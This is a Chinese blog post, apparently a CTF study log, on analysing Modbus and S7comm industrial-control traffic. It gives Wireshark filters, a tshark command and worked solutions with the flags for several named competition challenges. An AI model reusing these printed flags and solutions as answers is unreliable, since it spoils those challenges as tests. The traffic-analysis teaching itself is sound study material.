<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>CTF-ICS Learning Record - ⚡Lunatic BLOG⚡</title><meta name=author content="Lunatic"><meta name=description content="越来越多的比赛中出现工控相关的赛题，因此打算借这个机会学习一下。
"><meta name=keywords content='CTF'><meta itemprop=name content="CTF-ICS Learning Record"><meta itemprop=description content="越来越多的比赛中出现工控相关的赛题，因此打算借这个机会学习一下。"><meta itemprop=datePublished content="2024-10-25T16:57:39+08:00"><meta itemprop=dateModified content="2025-10-23T17:18:16+08:00"><meta itemprop=wordCount content="634"><meta itemprop=keywords content="CTF"><meta property="og:url" content="https://goodlunatic.github.io/posts/01ebd40/"><meta property="og:site_name" content="⚡Lunatic BLOG⚡"><meta property="og:title" content="CTF-ICS Learning Record"><meta property="og:description" content="越来越多的比赛中出现工控相关的赛题，因此打算借这个机会学习一下。"><meta property="og:locale" content="zh_CN"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-25T16:57:39+08:00"><meta property="article:modified_time" content="2025-10-23T17:18:16+08:00"><meta property="article:tag" content="CTF"><meta name=twitter:card content="summary"><meta name=twitter:title content="CTF-ICS Learning Record"><meta name=twitter:description content="越来越多的比赛中出现工控相关的赛题，因此打算借这个机会学习一下。"><meta name=application-name content="FixIt"><meta name=apple-mobile-web-app-title content="FixIt"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=https://www.nssctf.cn/files/2024/4/28/7f130a1387.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical type=text/html href=https://goodlunatic.github.io/posts/01ebd40/ title="CTF-ICS Learning Record - ⚡Lunatic BLOG⚡"><link rel=prev type=text/html href=https://goodlunatic.github.io/posts/848cf69/ title="IOT Security Research"><link rel=next type=text/html href=https://goodlunatic.github.io/posts/69280be/ title="2024 某金融系统内部赛 Misc Writeup"><link rel=alternate type=text/markdown href=https://goodlunatic.github.io/posts/01ebd40/index.md title="CTF-ICS Learning Record - ⚡Lunatic BLOG⚡"><link rel=stylesheet href=/css/config.min.css><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"CTF-ICS Learning Record","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/goodlunatic.github.io\/posts\/01ebd40\/"},"genre":"posts","keywords":"CTF","wordcount":634,"url":"https:\/\/goodlunatic.github.io\/posts\/01ebd40\/","datePublished":"2024-10-25T16:57:39+08:00","dateModified":"2025-10-23T17:18:16+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Lunatic"},"description":""}</script><script src=/js/head/color-scheme.min.js></script></head><body data-header-desktop=sticky data-header-mobile=auto><div class=wrapper data-page-style=normal><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper data-github-corner=left><div class=header-title><a href=/ title="⚡Lunatic BLOG⚡"><span class=header-title-text>⚡Lunatic BLOG⚡</span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class=menu-item><a class=menu-link href=/collections/><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> 合集</a></li><li class=menu-item><a class=menu-link href=/archives/><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> 归档</a></li><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden=true></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> 标签</a></li><li class=menu-item><a class=menu-link href=/friends/><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden=true></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden=true></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id=search-desktop><input type=text placeholder=搜索文章标题或内容…… id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></li><li class="menu-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="⚡Lunatic BLOG⚡"><span class=header-title-text>⚡Lunatic BLOG⚡</span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容…… id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fa-solid fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fa-solid fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></li><li class=menu-item><a class=menu-link href=/collections/><i class="fa-solid fa-layer-group fa-fw fa-sm" aria-hidden=true></i> 合集</a></li><li class=menu-item><a class=menu-link href=/archives/><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden=true></i> 归档</a></li><li class=menu-item><a class=menu-link href=/categories/><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden=true></i> 分类</a></li><li class=menu-item><a class=menu-link href=/tags/><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden=true></i> 标签</a></li><li class=menu-item><a class=menu-link href=/friends/><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden=true></i> 友链</a></li><li class=menu-item><a class=menu-link href=/about/><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden=true></i> 关于</a></li><li class="menu-item menu-system"><span class="menu-system-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></span></li></ul></nav></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=fi-container><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label=合集><div class="details related-details open"><div class="details-summary related-summary"><i class="fa-solid fa-fire fa-fade text-danger fa-fw" aria-hidden=true></i>
<span class=related-title>相关内容</span><i class="details-icon fa-solid fa-angle-right fa-fw" aria-hidden=true></i></div><div class="details-content related-content"><ul class=related-list><li class=related-item><a href=/posts/848cf69/ title="IOT Security Research">IOT Security Research</a></li><li class=related-item><a href=/posts/1eae35a/ title="2024 睿抗机器人开发者大赛（RAICOM）网络安全赛道初赛 Misc Writeup">2024 睿抗机器人开发者大赛（RAICOM）网络安全赛道初赛 Misc Writeup</a></li><li class=related-item><a href=/posts/4a27616/ title="2024 羊城杯网络安全大赛 Misc Writeup">2024 羊城杯网络安全大赛 Misc Writeup</a></li><li class=related-item><a href=/posts/417c7ba/ title="Pentesting Learning Record">Pentesting Learning Record</a></li><li class=related-item><a href=/posts/067cfbd/ title="2024 DASCTF 暑期挑战赛 Misc Writeup">2024 DASCTF 暑期挑战赛 Misc Writeup</a></li></ul></div></div><div class=aside-custom><a href target=_blank rel=external><img src=/images/zsxq.png alt="Lunatic Planet QR code" width=100%></a></div></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span>CTF-ICS Learning Record</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://goodlunatic.github.io title=作者 target=_blank rel="external nofollow noopener noreferrer author" class=author><img class=avatar src=https://www.nssctf.cn/files/2024/4/28/7f130a1387.png alt=Lunatic height=16 width=16>&nbsp;Lunatic</a></span><span class=post-included-in>&nbsp;收录于 <a href=/categories/ctf/ class=post-category title="分类 - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden=true></i> CTF</a></span></div><div class=post-meta-line><span title="发布于 2024-10-25 16:57:39"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden=true></i><time datetime=2024-10-25>2024-10-25</time></span>&nbsp;<span title="更新于 2025-10-23 17:18:16"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden=true></i><time datetime=2025-10-23>2025-10-23</time></span>&nbsp;<span title="634 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden=true></i>约 700 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden=true></i>预计阅读 3 分钟</span>&nbsp;<span id=busuanzi_container_page_pv class="busuanzi_visitors comment-visitors" data-flag-title="CTF-ICS Learning Record"><i class="fa-regular fa-eye fa-fw me-1" aria-hidden=true></i><span id=busuanzi_value_page_pv>-</span>&nbsp;次阅读
</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept=false><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fa-solid fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#工控协议分析>工控协议分析</a><ul><li><a href=#工控流量分析>工控流量分析</a><ul><li><a href=#modbus-协议分析>Modbus 协议分析</a><ul><li><a href=#例题1-hngk-modbus流量分析>例题1 HNGK-Modbus流量分析</a></li><li><a href=#例题1-hngk-modbus协议分析>例题1 HNGK-Modbus协议分析</a></li></ul></li><li><a href=#s7comm-协议分析>S7comm 协议分析</a><ul><li><a href=#例题1-2020icsc湖州站工控协议数据分析>例题1 2020ICSC湖州站—工控协议数据分析</a></li><li><a href=#例题2-2020icsc济南站被篡改的数据>例题2 2020ICSC济南站—被篡改的数据</a></li><li><a href=#例题3-枢网智盾2021异常流分析>例题3 枢网智盾2021—异常流分析</a></li><li><a href=#例题4-枢网智盾2021工控协议分析>例题4 枢网智盾2021—工控协议分析</a></li></ul></li></ul></li></ul></li><li><a href=#web渗透类>Web渗透类</a></li><li><a href=#逆向分析>逆向分析</a><ul><li><a href=#tp-link-sr20-本地网络远程代码执行漏洞>TP-Link SR20 本地网络远程代码执行漏洞</a></li></ul></li><li><a href=#工控编程与组态分析>工控编程与组态分析</a></li></ul></nav></div></div><div class=content id=content><p>越来越多的比赛中出现工控相关的赛题，因此打算借这个机会学习一下。</p><h2 class=heading-element id=工控协议分析><span>工控协议分析</span>
<a href=#%e5%b7%a5%e6%8e%a7%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><h3 class=heading-element id=工控流量分析><span>工控流量分析</span>
<a href=#%e5%b7%a5%e6%8e%a7%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>参考连接：https://blog.csdn.net/song123sh/article/details/128387982</p><p>将流量按长度降序排列，然后在各层寻找线索，</p><p>显示分组字节，从base64后开始，然后解码看文件类型，最后显示成该类型</p><h4 class=heading-element id=modbus-协议分析><span>Modbus 协议分析</span>
<a href=#modbus-%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>Modbus 流量主要有三类：Modbus/RTU、Modbus/ASCII、Modbus/TCP</p><p><strong>Modbus/RTU</strong></p><blockquote><p>从机地址1B+功能码1B+数据字段xB+CRC值2B</p><p>最大长度256B，所以数据字段最大长度252B</p></blockquote><p><strong>Modbus/ASCII</strong></p><blockquote><p>由Modbus/RTU衍生，采用0123456789ABCDEF 表示原本的从机地址、功能码、数据字段，并添加开始结束标记，所以长度翻倍</p></blockquote><p>开始标记:（0x3A）1B+从机地址2B+功能码2B+数据字段xB+LRC值2B+结束标记\r\n2B</p><p>最大长度513B，因为数据字段在RTU中是最大252B，所以在ASCII中最大504B</p><p><strong>Modbus/TCP</strong></p><blockquote><p>不再需要从机地址，改用UnitID；不再需要CRC/LRC，因为TCP自带校验</p></blockquote><p>传输标识符2B+协议标识符2B+长度2B+从机ID 1B+功能码1B+数据字段xB</p><p>一般题目考察 Modbus/TCP 比较多，然后主要考察的就是下面这种功能码（这里只列了部分）</p><p>因此解题的时候配合过滤器一个个功能码看过去就行
1：读线圈</p><p>2：读离散输入</p><p>3：读保持</p><p>4：读输入</p><p>5：写单个线圈</p><p>6：写单个保持</p><p>15：写多个线圈</p><p>16：写多个保持</p><p>如果题目考察的是查找异常流量，那么我们只要依次查看每个 func_code，然后根据字段排除正常流量</p><p>因为大部分的流量都是正常，异常的流量肯定是小部分</p><p>例如</p><p>先查看 (modbus) && (modbus.func_code == 17)，发现有很多 modbus.data == 06:00:00 的流量</p><p>因此过滤 modbus.data == 06:00:00 的流量：((modbus) && (modbus.func_code == 17)) && !(modbus.data == 06:00:00)</p><p>就是依次过滤正常流量，最后剩下来的就是异常流量了</p><h5 class=heading-element id=例题1-hngk-modbus流量分析><span>例题1 HNGK-Modbus流量分析</span>
<a href=#%e4%be%8b%e9%a2%981-hngk-modbus%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h5><p>使用下面这个过滤器命令即可得到 flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>(((_ws.col.protocol == &#34;Modbus/TCP&#34;) ) &amp;&amp; (modbus.byte_cnt)) &amp;&amp; (modbus.func_code == 16)</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/01ebd40/imgs/image-20240430142133329.png alt=/posts/01ebd40/imgs/image-20240430142133329.png height=2160 width=3842>
flag{TheModbusProtocolIsFunny!}</p><h5 class=heading-element id=例题1-hngk-modbus协议分析><span>例题1 HNGK-Modbus协议分析</span>
<a href=#%e4%be%8b%e9%a2%981-hngk-modbus%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h5><p>题目附件给了一个流量包，稍微翻一下，发现 modbus.func_code 只有四种情况：2、3、4、16</p><p>2和16的情况中没有发现什么异常，但是3和4的流量包中寄存器的值存在异常</p><p>modbus.func_code == 3 的情况中寄存器的值一直在增加，直到变成下图中的内容</p><p><img loading=lazy src=/posts/01ebd40/imgs/image-20240718212848008.png alt=/posts/01ebd40/imgs/image-20240718212848008.png height=1541 width=2562></p><p>而 modbus.func_code == 4 的情况则是一直在读寄存器的内容，寄存器中的内容和上面是一样的</p><p><img loading=lazy src=/posts/01ebd40/imgs/image-20240718213033248.png alt=/posts/01ebd40/imgs/image-20240718213033248.png height=1541 width=2562></p><p>因此猜测题目逻辑大概就是，3先写入寄存器的值，然后由4读取并发送</p><p>接下来我们就重点分析这段数据的内容，因为有不可见字符，所以我们复制为 Hex 格式</p><p>(((modbus) && (modbus.func_code == 3)) && (ip.src == 192.168.161.2)) && (modbus.byte_cnt)</p><h4 class=heading-element id=s7comm-协议分析><span>S7comm 协议分析</span>
<a href=#s7comm-%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><blockquote><p>西门子设备的工控协议，基于 COTP 实现，是COTP的上层协议</p><p>主要有三种类型：Job(1)、Ack_Data(3)/Ack(2)、Userdata(7)</p><p>Job：下发任务/指令</p><p>Ack_Data：带有返回数据</p><p>Ack：单纯确认，含有数据</p><p>Userdata：用户自定义数据区，也包含功能指令</p></blockquote><h5 class=heading-element id=例题1-2020icsc湖州站工控协议数据分析><span>例题1 2020ICSC湖州站—工控协议数据分析</span>
<a href=#%e4%be%8b%e9%a2%981-2020icsc%e6%b9%96%e5%b7%9e%e7%ab%99%e5%b7%a5%e6%8e%a7%e5%8d%8f%e8%ae%ae%e6%95%b0%e6%8d%ae%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h5><p>首先过滤出S7协议的数据包，发现在一些Ack_Data的数据包中传输了二进制数据
<img loading=lazy src=/posts/01ebd40/imgs/image-20240430111822297.png alt=/posts/01ebd40/imgs/image-20240430111822297.png height=2160 width=3842>
因此，我们将所有带有二进制数据的数据包都过滤出来，发现一些Job的数据包中也有二进制数据
<img loading=lazy src=/posts/01ebd40/imgs/image-20240430112312109.png alt=/posts/01ebd40/imgs/image-20240430112312109.png height=2160 width=3842>
然后我们尝试将所有带有二进制数据的Job数据包都过滤出来并导出特定分组，过滤器代码如下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>((</span>s7comm<span class=o>)</span> <span class=o>&amp;&amp;</span> <span class=o>(</span>s7comm.resp.data<span class=o>))</span> <span class=o>&amp;&amp;</span> <span class=o>(</span>s7comm.param.func <span class=o>==</span> 0x05<span class=o>)</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/01ebd40/imgs/image-20240430112740044.png alt=/posts/01ebd40/imgs/image-20240430112740044.png height=2154 width=3838></p><p>然后使用 tshark 提取数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>tshark -r 1.pcap -T fields -e s7comm.resp.data | uniq</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/01ebd40/imgs/image-20240430112936680.png alt=/posts/01ebd40/imgs/image-20240430112936680.png height=675 width=1731></p><p>最后 CyberChef 解码二进制即可得到 flag
<img loading=lazy src=/posts/01ebd40/imgs/image-20240430113016466.png alt=/posts/01ebd40/imgs/image-20240430113016466.png height=1197 width=2296></p><h5 class=heading-element id=例题2-2020icsc济南站被篡改的数据><span>例题2 2020ICSC济南站—被篡改的数据</span>
<a href=#%e4%be%8b%e9%a2%982-2020icsc%e6%b5%8e%e5%8d%97%e7%ab%99%e8%a2%ab%e7%af%a1%e6%94%b9%e7%9a%84%e6%95%b0%e6%8d%ae class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h5><p>翻看流量包，发现很多 S7COMM 数据包，使用过滤器过滤，发现 s7comm.resp.data 字段传了很多 66 数据</p><p>使用过滤器过滤出传了 s7comm.resp.data 字段数据但数据不是 66 的 S7 数据包</p><p>发现了疑似 flag 的数据，为了防止 flag 中含有 f 字符而被过滤</p><p>因此我们使用下面这个过滤命令进行过滤，然后导出特定分组</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>(((</span><span class=n>frame</span><span class=o>.</span><span class=n>number</span> <span class=o>&gt;=</span> <span class=mi>19987</span> <span class=o>&amp;&amp;</span> <span class=n>frame</span><span class=o>.</span><span class=n>number</span> <span class=o>&lt;=</span><span class=mi>20032</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>_ws</span><span class=o>.</span><span class=n>col</span><span class=o>.</span><span class=n>protocol</span> <span class=o>==</span> <span class=s2>&#34;S7COMM&#34;</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>s7comm</span><span class=o>.</span><span class=n>param</span><span class=o>.</span><span class=k>func</span> <span class=o>==</span> <span class=mh>0x05</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>s7comm</span><span class=o>.</span><span class=n>resp</span><span class=o>.</span><span class=n>data</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>最后 tshark 提取出数据，然后十六进制解码即可得到 flag：flag{93137ad4a}</p><h5 class=heading-element id=例题3-枢网智盾2021异常流分析><span>例题3 枢网智盾2021—异常流分析</span>
<a href=#%e4%be%8b%e9%a2%983-%e6%9e%a2%e7%bd%91%e6%99%ba%e7%9b%be2021%e5%bc%82%e5%b8%b8%e6%b5%81%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h5><p>打开流量包，发现很多 S7comm 流量，然后稍微过滤一下，发现是写入数据的流量</p><p>然后写入的数据几乎都是 ffff 开头的，因此我们直接查看不是 ffff 开头的数据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=p>((</span><span class=n>_ws</span><span class=o>.</span><span class=n>col</span><span class=o>.</span><span class=n>protocol</span> <span class=o>==</span> <span class=s2>&#34;S7COMM&#34;</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>s7comm</span><span class=o>.</span><span class=n>param</span><span class=o>.</span><span class=k>func</span> <span class=o>==</span> <span class=mh>0x05</span><span class=p>))</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>s7comm</span><span class=o>.</span><span class=n>resp</span><span class=o>.</span><span class=n>data</span><span class=p>[</span><span class=mi>0</span><span class=p>:</span><span class=mi>2</span><span class=p>]</span> <span class=o>!=</span> <span class=n>ff</span><span class=p>:</span><span class=n>ff</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>即可得到 flag：flag{ffad28a0ce69db34751f}</p><h5 class=heading-element id=例题4-枢网智盾2021工控协议分析><span>例题4 枢网智盾2021—工控协议分析</span>
